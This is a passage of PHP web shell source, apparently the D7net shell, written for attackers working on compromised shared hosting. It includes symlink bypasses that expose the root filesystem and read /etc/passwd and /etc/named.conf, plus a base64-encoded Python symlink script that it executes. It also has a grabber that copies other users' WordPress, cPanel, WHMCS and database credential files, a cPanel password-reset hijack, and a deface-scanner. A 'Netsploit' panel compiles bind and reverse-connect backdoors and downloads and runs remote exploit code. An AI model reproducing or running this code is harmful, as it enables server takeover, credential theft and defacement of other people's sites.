			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' placeholder='root.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' placeholder='d7net' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 300px;' name='url' placeholder='http://target.com/'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan!!	' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir [ /home/user/ ] dan 
		[ /home/user/public_html/ ]</center>";
	}
		} elseif (isset($_GET[hex('symlink')])) {
			echo "<br>";
			echo "<center>
<h2> Symlink </h2> <br>
<form method = 'POST'>
<input type = 'submit' name = 'symlink' class = 'form-control' value = 'Symlink' style='width: 200px;' height='10'><br>
<input type = 'submit' name = 'symlink2' class = 'form-control' value = 'Symlink v2' style='width: 200px;' height='10'><br>
<input type = 'submit' name = 'symlink_py' class = 'form-control' value = 'Symlink Python' style='width: 200px;' height='10'>
						</div>
						
						</div></form></center><hr><br>";

			if (isset($_POST['symlink'])) {
				@set_time_limit(0);

				echo "<br><br><center><h2>Symlink</h2></center><br><br><center><div class=content>";

				@mkdir('sym', 0777);
				$htaccess  = "Options all n DirectoryIndex net.html n AddType text/plain .php n AddHandler server-parsed .php n  AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";
				$write = @fopen('sym/.htaccess', 'w');
				fwrite($write, $htaccess);
				@symlink('/', 'sym/root');
				$filelocation = basename(__FILE__);
				$read_named_conf = @file('/etc/named.conf');
				if (!$read_named_conf) {
					echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
				} else {
					echo "<br><br><div class='tmp'><table border='1' bordercolor='lime' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
					foreach ($read_named_conf as $subject) {
						if (eregi('zone', $subject)) {
							preg_match_all('#zone "(.*)"#', $subject, $string);
							flush();
							if (strlen(trim($string[1][0])) > 2) {
								$UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
								$name = $UID['name'];
								@symlink('/', 'sym/root');
								$name   = $string[1][0];
								$iran   = '.ir';
								$israel = '.il';
								$indo   = '.id';
								$sg12   = '.sg';
								$edu    = '.edu';
								$gov    = '.gov';
								$gose   = '.go';
								$gober  = '.gob';
								$mil1   = '.mil';
								$mil2   = '.mi';
								$malay	= '.my';
								$china	= '.cn';
								$japan	= '.jp';
								$austr	= '.au';
								$porn	= '.xxx';
								$as		= '.uk';
								$calfn	= '.ca';

								if (
									eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0])
									or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0])
									or eregi("$malay", $string[1][0]) or eregi("$china", $string[1][0]) or eregi("$japan", $string[1][0]) or eregi("$austr", $string[1][0])
									or eregi("$porn", $string[1][0]) or eregi("$as", $string[1][0]) or eregi("$calfn", $string[1][0])
								) {
									$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $string[1][0] . '</div>';
								}
								echo "
			<tr>

			<td>
			<div class='dom'><a target='_blank' href=http://www." . $string[1][0] . '/>' . $name . ' </a> </div>
			</td>

			<td>
			' . $UID['name'] . "
			</td>

			<td>
			<a href='sym/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
			</td>

			</tr></div> ";
								flush();
							}
						}
					}
				}

				echo "</center></table>";
			} elseif (isset($_POST['symlink2'])) {

				$dir = path();
				$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
				$d0mains = @file("/etc/named.conf");
				##httaces
				if ($d0mains) {
					@mkdir("D7net_sym", 0777);
					@chdir("D7net_sym");
					@exe("ln -s / root");
					$file3 = 'Options Indexes FollowSymLinks
					DirectoryIndex net.html
					AddType text/plain .php
					AddHandler text/plain .php
					Satisfy Any';
					$fp3 = fopen('.htaccess', 'w');
					$fw3 = fwrite($fp3, $file3);
					@fclose($fp3);
					echo "
					<table align=center border=1 style='width:60%;border-color:#333333;'>
					<tr>
					<td align=center><font size=2>S. No.</font></td>
					<td align=center><font size=2>Domains</font></td>
					<td align=center><font size=2>Users</font></td>
					<td align=center><font size=2>Symlink</font></td>
					</tr>";
					$dcount = 1;
					foreach ($d0mains as $d0main) {
						if (eregi("zone", $d0main)) {
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
							if (strlen(trim($domains[1][0])) > 2) {
								$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
								echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www." . $domains[1][0] . "/><font class=txt>" . $domains[1][0] . "</font></a></td>
<td>" . $user['name'] . "</td>
<td><a href='$full/D7net_sym/root/home/" . $user['name'] . "/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
								flush();
								$dcount++;
							}
						}
					}
					echo "</table>";
				} else {
					$TEST = @file('/etc/passwd');
					if ($TEST) {
						@mkdir("D7net_sym", 0777);
						@chdir("D7net_sym");
						exe("ln -s / root");
						$file3 = 'Options Indexes FollowSymLinks
						DirectoryIndex net.htm
						AddType text/plain .php
						AddHandler text/plain .php
						Satisfy Any';
						$fp3 = fopen('.htaccess', 'w');
						$fw3 = fwrite($fp3, $file3);
						@fclose($fp3);
						echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
						$dcount = 1;
						$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
						while (!feof($file)) {
							$s = fgets($file);
							$matches = array();
							$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
							$matches = str_replace("home/", "", $matches[1]);
							if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
								continue;
							echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 							<td align=center><font class=txt>" . $matches . "</td>";
							echo "<td align=center><font class=txt><a href=$full/D7net_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
							$dcount++;
						}
						fclose($file);
						echo "</table>";
					} else {
						if ($os != "Windows") {
							@mkdir("D7net_sym", 0777);
							@chdir("D7net_sym");
							@exe("ln -s / root");
							$file3 = '
 							Options Indexes FollowSymLinks
							DirectoryIndex net.htm
							AddType text/plain .php
							AddHandler text/plain .php
							Satisfy Any';
							$fp3 = fopen('.htaccess', 'w');
							$fw3 = fwrite($fp3, $file3);
							@fclose($fp3);
							echo "
 <h2><center>Symlink2</center></h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
							$temp = "";
							$val1 = 0;
							$val2 = 1000;
							for (; $val1 <= $val2; $val1++) {
								$uid = @posix_getpwuid($val1);
								if ($uid) $temp .= join(':', $uid) . "\n";
							}
							echo '<br/>';
							$temp = trim($temp);
							$file5 =
								fopen("test.txt", "w");
							fputs($file5, $temp);
							fclose($file5);
							$dcount = 1;
							$file =
								fopen("test.txt", "r") or exit("Unable to open file!");
							while (!feof($file)) {
								$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/", "", $matches[1]);
								if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
								echo "<td align=center><font class=txt><a href=$full/D7net_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
								$dcount++;
							}
							fclose($file);
							echo "</table></center>";
							unlink("test.txt");
						} else
							echo "<center><font size=3>Cannot create Symlink</font></center>";
					}
				}
			} elseif (isset($_POST['symlink_py'])) {
				$sym_dir = mkdir('d7_sympy', 0755);
				chdir('d7_sympy');
				$file_sym = "sym.py";
				$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
				$sym = fopen($file_sym, "w");
				fwrite($sym, base64_decode($sym_script));
				chmod($file_sym, 0755);
				$jancok = exe("python sym.py");
				echo "<br><center>Done ... <a href='d7_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
			}
		} elseif (isset($_GET[hex('config')])) {
			$dir = path();
			if ($_POST) {
				$passwd = $_POST['passwd'];
				mkdir("d7net_config", 0777);
				$isi_htc = "Options all\nRequire None\nSatisfy Any";
				$htc = fopen("d7net_config/.htaccess", "w");
				fwrite($htc, $isi_htc);
				preg_match_all('/(.*?):x:/', $passwd, $user_config);
				foreach ($user_config[1] as $user_D7net) {
					$user_config_dir = "/home/$user_D7net/public_html/";
					if (is_readable($user_config_dir)) {
						$grab_config = array(
							"/home/$user_D7net/.my.cnf" => "cpanel",
							"/home/$user_D7net/.accesshash" => "WHM-accesshash",
							"/home/$user_D7net/public_html/bw-configs/config.ini" => "BosWeb",
							"/home/$user_D7net/public_html/config/koneksi.php" => "Lokomedia",
							"/home/$user_D7net/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home/$user_D7net/public_html/clientarea/configuration.php" => "WHMCS",
							"/home/$user_D7net/public_html/whm/configuration.php" => "WHMCS",
							"/home/$user_D7net/public_html/whmcs/configuration.php" => "WHMCS",
							"/home/$user_D7net/public_html/forum/config.php" => "phpBB",
							"/home/$user_D7net/public_html/sites/default/settings.php" => "Drupal",
							"/home/$user_D7net/public_html/config/settings.inc.php" => "PrestaShop",
							"/home/$user_D7net/public_html/app/etc/local.xml" => "Magento",
							"/home/$user_D7net/public_html/joomla/configuration.php" => "Joomla",
							"/home/$user_D7net/public_html/configuration.php" => "Joomla",
							"/home/$user_D7net/public_html/wp/wp-config.php" => "WordPress",
							"/home/$user_D7net/public_html/wordpress/wp-config.php" => "WordPress",
							"/home/$user_D7net/public_html/wp-config.php" => "WordPress",
							"/home/$user_D7net/public_html/admin/config.php" => "OpenCart",
							"/home/$user_D7net/public_html/slconfig.php" => "Sitelok",
							"/home/$user_D7net/public_html/application/config/database.php" => "Ellislab",
							"/home1/$user_D7net/.my.cnf" => "cpanel",
							"/home1/$user_D7net/.accesshash" => "WHM-accesshash",
							"/home1/$user_D7net/public_html/bw-configs/config.ini" => "BosWeb",
							"/home1/$user_D7net/public_html/config/koneksi.php" => "Lokomedia",
							"/home1/$user_D7net/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home1/$user_D7net/public_html/clientarea/configuration.php" => "WHMCS",
							"/home1/$user_D7net/public_html/whm/configuration.php" => "WHMCS",
							"/home1/$user_D7net/public_html/whmcs/configuration.php" => "WHMCS",
							"/home1/$user_D7net/public_html/forum/config.php" => "phpBB",
							"/home1/$user_D7net/public_html/sites/default/settings.php" => "Drupal",
							"/home1/$user_D7net/public_html/config/settings.inc.php" => "PrestaShop",
							"/home1/$user_D7net/public_html/app/etc/local.xml" => "Magento",
							"/home1/$user_D7net/public_html/joomla/configuration.php" => "Joomla",
							"/home1/$user_D7net/public_html/configuration.php" => "Joomla",
							"/home1/$user_D7net/public_html/wp/wp-config.php" => "WordPress",
							"/home1/$user_D7net/public_html/wordpress/wp-config.php" => "WordPress",
							"/home1/$user_D7net/public_html/wp-config.php" => "WordPress",
							"/home1/$user_D7net/public_html/admin/config.php" => "OpenCart",
							"/home1/$user_D7net/public_html/slconfig.php" => "Sitelok",
							"/home1/$user_D7net/public_html/application/config/database.php" => "Ellislab",
							"/home2/$user_D7net/.my.cnf" => "cpanel",
							"/home2/$user_D7net/.accesshash" => "WHM-accesshash",
							"/home2/$user_D7net/public_html/bw-configs/config.ini" => "BosWeb",
							"/home2/$user_D7net/public_html/config/koneksi.php" => "Lokomedia",
							"/home2/$user_D7net/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home2/$user_D7net/public_html/clientarea/configuration.php" => "WHMCS",
							"/home2/$user_D7net/public_html/whm/configuration.php" => "WHMCS",
							"/home2/$user_D7net/public_html/whmcs/configuration.php" => "WHMCS",
							"/home2/$user_D7net/public_html/forum/config.php" => "phpBB",
							"/home2/$user_D7net/public_html/sites/default/settings.php" => "Drupal",
							"/home2/$user_D7net/public_html/config/settings.inc.php" => "PrestaShop",
							"/home2/$user_D7net/public_html/app/etc/local.xml" => "Magento",
							"/home2/$user_D7net/public_html/joomla/configuration.php" => "Joomla",
							"/home2/$user_D7net/public_html/configuration.php" => "Joomla",
							"/home2/$user_D7net/public_html/wp/wp-config.php" => "WordPress",
							"/home2/$user_D7net/public_html/wordpress/wp-config.php" => "WordPress",
							"/home2/$user_D7net/public_html/wp-config.php" => "WordPress",
							"/home2/$user_D7net/public_html/admin/config.php" => "OpenCart",
							"/home2/$user_D7net/public_html/slconfig.php" => "Sitelok",
							"/home2/$user_D7net/public_html/application/config/database.php" => "Ellislab",
							"/home3/$user_D7net/.my.cnf" => "cpanel",
							"/home3/$user_D7net/.accesshash" => "WHM-accesshash",
							"/home3/$user_D7net/public_html/bw-configs/config.ini" => "BosWeb",
							"/home3/$user_D7net/public_html/config/koneksi.php" => "Lokomedia",
							"/home3/$user_D7net/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home3/$user_D7net/public_html/clientarea/configuration.php" => "WHMCS",
							"/home3/$user_D7net/public_html/whm/configuration.php" => "WHMCS",
							"/home3/$user_D7net/public_html/whmcs/configuration.php" => "WHMCS",
							"/home3/$user_D7net/public_html/forum/config.php" => "phpBB",
							"/home3/$user_D7net/public_html/sites/default/settings.php" => "Drupal",
							"/home3/$user_D7net/public_html/config/settings.inc.php" => "PrestaShop",
							"/home3/$user_D7net/public_html/app/etc/local.xml" => "Magento",
							"/home3/$user_D7net/public_html/joomla/configuration.php" => "Joomla",
							"/home3/$user_D7net/public_html/configuration.php" => "Joomla",
							"/home3/$user_D7net/public_html/wp/wp-config.php" => "WordPress",
							"/home3/$user_D7net/public_html/wordpress/wp-config.php" => "WordPress",
							"/home3/$user_D7net/public_html/wp-config.php" => "WordPress",
							"/home3/$user_D7net/public_html/admin/config.php" => "OpenCart",
							"/home3/$user_D7net/public_html/slconfig.php" => "Sitelok",
							"/home3/$user_D7net/public_html/application/config/database.php" => "Ellislab"
						);
						foreach ($grab_config as $config => $nama_config) {
							$ambil_config = file_get_contents($config);
							if ($ambil_config == '') {
							} else {
								$file_config = fopen("d7net_config/$user_D7net-$nama_config.txt", "w");
								fputs($file_config, $ambil_config);
							}
						}
					}
				}
				echo "<center><a href='?dir=$dir/d7net_config'><font color=lime>Done</font></a></center>";
			} else {
				$baru = hex($dir);
				$baru2 = hex('bypass-passwd');
				echo "<br><center>";
				echo "<h2>Config Grabber</h2>";
				echo "<form method=\"post\" action=\"\"><center>/etc/passwd ( Error ? 
				<a href='?d7net=$baru&$baru2'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area form-control' rows='15' cols='60'>\n";
				echo file_get_contents('/etc/passwd');
				echo "</textarea><br><input type=\"submit\" value=\"Grab\" class = 'form-control' style='width:250px;'></td></tr></center>\n";
				echo "<br><hr>";
			}
		} elseif (isset($_GET[hex('all_tools')])) {

echo '<br>
<tr><td>
			<center><h2>Pilih Toolsnya Ster</h2><br>
<table align=center border=1 style="width:60%;border-color:#030303;">
  <tr>
    <td><a class = "form-control" href = ?d7net=' . hex($d7net) . '&' . hex("jumping") . '><center>Jumping</center></a></td>
    <td><a class = "form-control" href = ?d7net=' . hex($d7net) . '&' . hex("zip-menu") . '><center>Unzip</td>
    <td><a class = "form-control" href = ?d7net=' . hex($d7net) . '&' . hex("fake-root") . '><center>Fake Root</td>
    <td><a class = "form-control" href = ?d7net=' . hex($d7net) . '&' . hex("network") . '><center>Network</td>
</tr></table><br>';
		} elseif (isset($_GET[hex('cpanel-r')])) {
			echo '<br><center><h2>Cpanel Reset/Crack Password</h2><br>
			<table align=center border=1 style="width:60%;border-color:#030303;">
			<tr>
			    <td><a class = "form-control" href = ?d7net=' . hex($d7net) . '&' . hex("cpanel-reset") . '><center>Cpanel Reset</center></a></td>
			    <td><a class = "form-control" href = ?d7net=' . hex($d7net) . '&' . hex("cp-crack") . '><center>Cpanel Crack</center></a></td>
			    </tr></table><br>';

		} elseif (isset($_GET[hex('jumping')])) {

			echo "<br><center><h2>Jumping</h2>";
			echo "<form method = 'POST' action = ''>";
			echo "<input type = 'submit' name = 'jump' class='form-control' style='width:250px;height:40px;' value = 'Jump!'> ";
			echo "<hr><br></center>";

			if (isset($_POST['jump'])) {

				$i = 0;
				echo "<pre><div class='margin: 5px auto;'>";
				$etc = fopen("/etc/passwd", "r") or die("<font color=orange>Can't read /etc/passwd</font>");
				while ($passwd = fgets($etc)) {
					if ($passwd == '' || !$etc) {
						echo "<font color=red>Can't read /etc/passwd</font>";
					} else {
						preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
						foreach ($user_jumping[1] as $user_D7net_jump) {
							$user_jumping_dir = "/home/$user_D7net_jump/public_html";
							if (is_readable($user_jumping_dir)) {
								$i++;
								$jrw = "[<font color=lime>R</font>] <a href='?d7net=" . hex($user_jumping_dir) . "'><font color=gold>$user_jumping_dir</font></a>";
								if (is_writable($user_jumping_dir)) {
									$jrw = "[<font color=lime>RW</font>] <a href='?d7net=" . hex($user_jumping_dir) . "'><font color=gold>$user_jumping_dir</font></a>";
								}
								echo $jrw;
								if (function_exists('posix_getpwuid')) {
									$domain_jump = file_get_contents("/etc/named.conf");
									if ($domain_jump == '') {
										echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
									} else {
										preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
										foreach ($domains_jump[1] as $dj) {
											$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
											$user_jumping_url = $user_jumping_url['name'];
											if ($user_jumping_url == $user_D7net_jump) {
												echo " => ( <u>$dj</u> )<br>";
												break;
											}
										}
									}
								} else {
									echo "<br>";
								}
							}
						}
					}
				}
				if ($i == 0) {
				} else {
					echo "<br>Total ada " . $i . " Kamar di " . gethostbyname($_SERVER['HTTP_HOST']) . "";
				}
				echo "</div></pre>";
			}
		} elseif (isset($_GET[hex('cpanel-reset')])) {

			echo '
		<br>
         <center>
         <h2>Cpanel Reset</h2>
         <br><br>
         
  	
  	    <form action="" method="post">
  	<input type="email" name="email" placeholder="Email" class="form-control" style = "width:250px; height:40px;" autocomplete="off"  />
  	<br>
  	<input type="submit" name="submit" value="Reset Password!" class = "form-control" style = "width:250px; height:40px;" />

  	</form>
  	<br>
  	</div>
  	     </center>
  	     <hr>
     ';
			$user = get_current_user();
			$site = $_SERVER['HTTP_HOST'];
			$ips = getenv('REMOTE_ADDR');

			if (isset($_POST['submit'])) {

				$email = $_POST['email'];
				$wr = 'email:' . $email;
				$wc = "$email";
				$f = fopen('/home/' . $user . '/.cpanel/contactinfo', 'w');
				fwrite($f, $wr);
				fclose($f);
				$fwc = fopen('/home/' . $user . '/.contactemail', 'w');
				fwrite($fwc, $wc);
				fclose($fwc);
				$nets = "Disini : " . $site . ':2083/resetpass?start=1<br>Username : ' . $user .'';
				echo '<br/><center>' . $nets . '</center>';
			};
			} elseif (isset($_GET[hex('network')])) {

			$dir = path();
			// bind connect with c
			if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
				$port = trim($_POST['port']);
				$passwrd = trim($_POST['bind_pass']);
				tulis("bdc.c", $port_bind_bd_c);
				exe("gcc -o bdc bdc.c");
				exe("chmod 777 bdc");
				@unlink("bdc.c");
				exe("./bdc " . $port . " " . $passwrd . " &");
				$scan = exe("ps aux");
				if (eregi("./bdc $por", $scan)) {
					$msg = "<p>Process found running, backdoor setup successfully.</p>";
				} else {
					$msg =  "<p>Process not found running, backdoor not setup successfully.</p>";
				}
			}
			// bind connect with perl
			elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
				$port = trim($_POST['port']);
				$passwrd = trim($_POST['bind_pass']);
				tulis("bdp", $port_bind_bd_pl);
				exe("chmod 777 bdp");
				$p2 = which("perl");
				exe($p2 . " bdp " . $port . " &");
				$scan = exe("ps aux");
				if (eregi("$p2 bdp $port", $scan)) {
					$msg = "<p>Process found running, backdoor setup successfully.</p>";
				} else {
					$msg = "<p>Process not found running, backdoor not setup successfully.</p>";
				}
			}
			// back connect with c
			elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
				$ip = trim($_POST['ip']);
				$port = trim($_POST['backport']);
				tulis("bcc.c", $back_connect_c);
				exe("gcc -o bcc bcc.c");
				exe("chmod 777 bcc");
				@unlink("bcc.c");
				exe("./bcc " . $ip . " " . $port . " &");
				$msg = "Now script try connect to " . $ip . " port " . $port . " ...";
			}
			// back connect with perl
			elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
				$ip = trim($_POST['ip']);
				$port = trim($_POST['backport']);
				tulis("bcp", $back_connect);
				exe("chmod +x bcp");
				$p2 = which("perl");
				exe($p2 . " bcp " . $ip . " " . $port . " &");
				$msg = "Now script try connect to " . $ip . " port " . $port . " ...";
			} elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {
				$pilihan = trim($_POST['pilihan']);
				$wurl = trim($_POST['wurl']);
				$namafile = download($pilihan, $wurl);
				if (is_file($namafile)) {

					$msg = exe($wcmd);
				} else $msg = "error: file not found $namafile";
			}

		?>
			<br>
			<center>
				<h2>Netsploit</h2>
				<table class="tabnet">
					<tr>
						<th>Port Binding</th>
						<th>Connect Back</th>
						<th>Load and Exploit</th>
					</tr>
					<tr>
						<td>
							<table align=center border=1 style="width:60%;border-color:#030303;">
								<form method="post">
									<tr>
										<td>Port : <input type="text" name="port" size="26" value="<?php echo $bindport ?>"><br> Pass : <input type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"><br><select class="form-control" size="1" name="use">
												<option value="Perl">Perl</option>
												<option value="C">C</option>
											</select><br><input class="form-control" type="submit" name="bind" value="Bind" style="width:80px"></td>
									</tr>
								</form>
							</table>
						</td>
						<td>
							<table align=center border=1 style="width:60%;border-color:#030303;">
								<form method="post">
									<tr>
										<td>IP : <input type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"><br>Port : <input type="text" name="backport" size="26" value="<?php echo $bindport; ?>"><br><select size="1" class="form-control" name="use">
												<option value="Perl">Perl</option>
												<option value="C">C</option>
											</select><br><input type="submit" name="backconn" value="Connect" class="form-control" style="width:100px"></td>
									</tr>

								</form>
							</table>
						</td>
						<td>
							<table align=center border=1 style="width:60%;border-color:#030303;">
								<form method="post">
									<tr>
										<td>Url : <input type="text" name="wurl" style="width:220px;" value="www.some-code/exploits.c"><br>Cmd : <input type="text" name="wcmd" style="width:220px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"><br><select class="form-control" size="1" name="pilihan">
												<option value="wwget">wget</option>
												<option value="wlynx">lynx</option>
												<option value="wfread">fread</option>
												<option value="wfetch">fetch</option>
